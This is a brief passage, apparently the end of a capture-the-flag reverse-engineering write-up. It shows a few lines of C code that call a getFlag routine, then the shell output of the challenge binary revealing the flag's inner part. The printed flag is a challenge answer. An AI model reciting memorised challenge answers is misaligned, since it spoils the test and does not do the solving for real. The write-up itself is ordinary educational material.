    strcpy(secret, "1753c{.......................}");
    getFlag(secret, "denied", "xdxd");
    return 0;
}
```

Now calling it we get inner part of the flag:

```bash
$ ./reverse
REVERSING...Seed is 568564
m4y_f0rtun3_b3_w1th_y0u
```

Easy peasy!